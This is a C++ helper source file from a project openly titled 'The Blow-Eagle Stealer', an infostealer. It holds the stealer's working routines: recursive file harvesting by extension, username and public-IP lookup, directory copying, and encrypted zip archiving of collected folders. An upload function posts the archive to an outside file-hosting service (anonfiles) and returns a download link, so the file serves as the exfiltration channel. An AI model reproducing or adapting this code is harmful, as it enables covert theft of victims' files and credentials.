/*
|==================================================================================================================|
|████████╗██╗░░██╗███████╗  ██████╗░██╗░░░░░░█████╗░░██╗░░░░░░░██╗░░░░░░███████╗░█████╗░░██████╗░██╗░░░░░███████╗ |
|╚══██╔══╝██║░░██║██╔════╝  ██╔══██╗██║░░░░░██╔══██╗░██║░░██╗░░██║░░░░░░██╔════╝██╔══██╗██╔════╝░██║░░░░░██╔════╝ |
|░░░██║░░░███████║█████╗░░  ██████╦╝██║░░░░░██║░░██║░╚██╗████╗██╔╝█████╗█████╗░░███████║██║░░██╗░██║░░░░░█████╗░░ |
|░░░██║░░░██╔══██║██╔══╝░░  ██╔══██╗██║░░░░░██║░░██║░░████╔═████║░╚════╝██╔══╝░░██╔══██║██║░░╚██╗██║░░░░░██╔══╝░░ |
|░░░██║░░░██║░░██║███████╗  ██████╦╝███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░░░░░░░███████╗██║░░██║╚██████╔╝███████╗███████╗ |
|░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░░░░╚══════╝╚═╝░░╚═╝░╚═════╝░╚══════╝╚══════╝ |
|                                                                                                                  |
|                               ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░                          |
|                               ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗                          |
|                               ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝                          |
|                               ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗                          |
|                               ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║                          |
|                               ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝                          |
|==================================================================================================================|

-----------------------------------------------------------------
|by: Nick_Vinesmoke                                             |
|Autor github: https://github.com/Nick-Vinesmoke                |
|Original repo: https://github.com/Nick-Vinesmoke/The-Blow-Eagle|
-----------------------------------------------------------------
*/

#include "helper.h"

size_t func::WriteCallback(char* contents, size_t size, size_t nmemb, std::string* output) {
	size_t totalSize = size * nmemb;
	output->append(contents, totalSize);
	return totalSize;
}


int func::create_archive(std::string archive_name, std::string folder_path, std::string password)
{
	zip_t* archive = zip_open(archive_name.c_str(), ZIP_CREATE | ZIP_EXCL, 0);
	if (!archive) {
		std::cerr << "Failed to create the archive." << std::endl;
		return -1;
	}
	std::filesystem::path absolute_path = std::filesystem::absolute(folder_path);
	int count = -1;
	for (const auto& entry : std::filesystem::recursive_directory_iterator(absolute_path)) {
		std::string entry_path = entry.path().string();
		std::string entry_name = std::filesystem::relative(entry_path, absolute_path).string();
		std::string archive_path = entry_name;
		std::replace(archive_path.begin(), archive_path.end(), '\\', '/'); // replace '\' to '/'
		zip_source_t* source = zip_source_file(archive, entry_path.c_str(), 0, 0);
		if (!source) {
			std::cerr << "Failed to create a zip source for the entry '" << entry_name << "'." << std::endl;
			zip_close(archive);
			return -1;
		}
		if (std::filesystem::is_directory(entry)) { // add directory to archive
			if (zip_dir_add(archive, archive_path.c_str(), ZIP_FL_ENC_GUESS) < 0) {
				std::cerr << "Failed to add the entry '" << entry_name << "' to the archive." << std::endl;
				zip_source_free(source);
				zip_close(archive);
				return -1;
			}
		}
		else { // add file to archive
			if (zip_file_add(archive, archive_path.c_str(), source, ZIP_FL_ENC_GUESS) < 0) {
				std::cerr << "Failed to add the entry '" << entry_name << "' to the archive." << std::endl;
				zip_source_free(source);
				zip_close(archive);
				return -1;
			}
		}
		count += 1;
		try
		{
			zip_file_set_encryption(archive, count, ZIP_EM_AES_256, password.c_str());
		}
		catch (...) {

		}
	}

	if (zip_close(archive) < 0) {
		std::cerr << "Failed to save and close the archive." << std::endl;
		return -1;
	}
	return 0;
}

void deleteSubstring(std::string& str, const std::string& substr) {
	size_t pos = str.find(substr);
	while (pos != std::string::npos) {
		str.erase(pos, substr.length());
		pos = str.find(substr);
	}
}

void replaceAll(std::string& str, const std::string& oldSubstr, const std::string& newSubstr) {
	size_t pos = 0;
	while ((pos = str.find(oldSubstr, pos)) != std::string::npos) {
		str.replace(pos, oldSubstr.length(), newSubstr);
		pos += newSubstr.length();
	}
}

std::string func::upload_file(const std::string& file_path) {
	std::ifstream fileStream(file_path, std::ios::binary);
	if (!fileStream) {
		std::cerr << "Failed to open file: " << file_path << std::endl;
		return "";
	}

	std::string response;
	curl_global_init(CURL_GLOBAL_DEFAULT);
	CURL* curl = curl_easy_init();
	if (curl) {
		curl_easy_setopt(curl, CURLOPT_URL, "https://api.anonfiles.com/upload");
		curl_easy_setopt(curl, CURLOPT_POST, 1L);

		// Set the file as the POST field
		curl_mime* mime = curl_mime_init(curl);
		curl_mimepart* part = curl_mime_addpart(mime);
		curl_mime_name(part, "file");
		curl_mime_filedata(part, file_path.c_str());
		curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);

		// Set the response callback function
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, func::WriteCallback);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

		// Perform the upload
		CURLcode res = curl_easy_perform(curl);
		if (res != CURLE_OK) {
			std::cerr << "Failed to upload file: " << curl_easy_strerror(res) << std::endl;
		}

		// Clean up
		curl_easy_cleanup(curl);
		curl_mime_free(mime);
		curl_global_cleanup();
	}

	std::string fileLink = "";

	deleteSubstring(response, "{\n\t\"status\": true,\n\t\"data\": {\n\t\t\"file\": {\n\t\t\t\"url\": {\n\t\t\t\t\"full\": \"");
	deleteSubstring(response, "{\n\t\"status\": true,\n\t\"data\": {\n\t\t\"file\": {\n\t\t\t\"url\": {\n\t\t\t\t\"short\": \"");
	int index = response.find('"');
	std::string link = response.substr(0, index);
	replaceAll(link, "\\/", "/");
	return link;
}

std::string func::GetIP()
{
	std::string ipAddress = "";

	CURL* curl = curl_easy_init();
	if (curl) {
		curl_easy_setopt(curl, CURLOPT_URL, "https://api.ipify.org");
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, func::WriteCallback);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &ipAddress);

		CURLcode res = curl_easy_perform(curl);
		if (res != CURLE_OK) {
			return "Failed to retrieve IP address: " + std::string(curl_easy_strerror(res));
		}

		curl_easy_cleanup(curl);
	}
	return ipAddress;
}

void func::GetFilePaths(const std::string& directory, std::vector<std::string>& filePaths, std::string ext)
{
	WIN32_FIND_DATAA fileData;
	HANDLE hFind = INVALID_HANDLE_VALUE;

	std::string searchPath = directory + "\\*";
	hFind = FindFirstFileA(searchPath.c_str(), &fileData);

	if (hFind != INVALID_HANDLE_VALUE)
	{
		do
		{
			if (fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				if (strcmp(fileData.cFileName, ".") != 0 && strcmp(fileData.cFileName, "..") != 0)
				{
					std::string subdirPath = directory + "\\" + fileData.cFileName;
					func::GetFilePaths(subdirPath, filePaths, ext);
				}
			}
			else
			{
				std::string filePath = directory + "\\" + fileData.cFileName;
				if (filePath.substr(filePath.length() - std::size(ext)) == ext)
				{
					filePaths.push_back(filePath);
				}
			}
		} while (FindNextFileA(hFind, &fileData) != 0);

		FindClose(hFind);
	}
}

std::string func::GetUser()
{
	TCHAR s[UNLEN + 1];
	DWORD sizethis = UNLEN + 1;
	GetUserName((TCHAR*)s, &sizethis);
	std::wstring ws(s);
	std::string userName(ws.begin(), ws.end());
	return userName;
}


void func::GetDirectories(const std::string& directoryPath, std::string*& arr, int& arrSize)
{
	std::vector<std::string> directories;

	std::string searchPath = directoryPath + "\\*";

	WIN32_FIND_DATAA findData;
	HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);

	if (hFind != INVALID_HANDLE_VALUE)
	{
		do
		{
			if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				std::string directoryName = findData.cFileName;

				// Exclude current directory (.) and parent directory (..)
				if (directoryName != "." && directoryName != "..")
				{
					std::string* arr2 = new std::string[arrSize + 1];
					for (size_t i = 0; i < arrSize; i++)
					{
						arr2[i] = arr[i];
					}
					arr2[arrSize] = directoryName;
					arrSize++;
					arr = new std::string[arrSize];
					for (size_t i = 0; i < arrSize; i++)
					{
						arr[i] = arr2[i];
					}
					delete[] arr2;
				}
			}
		} while (FindNextFileA(hFind, &findData));

		FindClose(hFind);
	}

}

void func::copyDirectory(const std::filesystem::path& sourceDir, const std::filesystem::path& destinationDir) {
	try
	{
		// Create the destination directory if it doesn't exist
		std::filesystem::create_directory(destinationDir);

		// Iterate over the files and directories in the source directory
		for (const auto& entry : std::filesystem::directory_iterator(sourceDir)) {
			const auto& path = entry.path();

			// Construct the corresponding path in the destination directory
			const auto& destinationPath = destinationDir / path.filename();

			// Check if the current entry is a directory
			if (std::filesystem::is_directory(path)) {
				// Recursively copy the directory
				copyDirectory(path, destinationPath);
			}
			else {
				// Copy the file
				std::filesystem::copy_file(path, destinationPath);
			}
		}
	}
	catch (const std::filesystem::filesystem_error& ex) {
		std::cerr << "Failed to copy directory: " << ex.what() << std::endl;
	}
}

void func::copyFile(const std::string& sourcePath, const std::string& destinationPath) {
	try {
		// Copy the file
		std::filesystem::copy(sourcePath, destinationPath, std::filesystem::copy_options::overwrite_existing);
	}
	catch (const std::filesystem::filesystem_error& ex) {
		std::cerr << "Failed to copy file: " << ex.what() << std::endl;
	}
}

void func::GetFilesInDir(std::string directoryPath, std::string*& arr, int& arrSize)
{

	try {
		for (const auto& entry : std::filesystem::directory_iterator(directoryPath)) {
			if (std::filesystem::is_regular_file(entry)) {
				std::string* arr2 = new std::string[arrSize + 1];
				for (size_t i = 0; i < arrSize; i++)
				{
					arr2[i] = arr[i];
				}
				arr2[arrSize] = entry.path().filename().string();
				arrSize++;
				arr = new std::string[arrSize];
				for (size_t i = 0; i < arrSize; i++)
				{
					arr[i] = arr2[i];
				}
				delete[] arr2;
			}
		}
	}
	catch (const std::filesystem::filesystem_error& ex) {
		std::cerr << "Error accessing directory: " << ex.what() << std::endl;
	}
}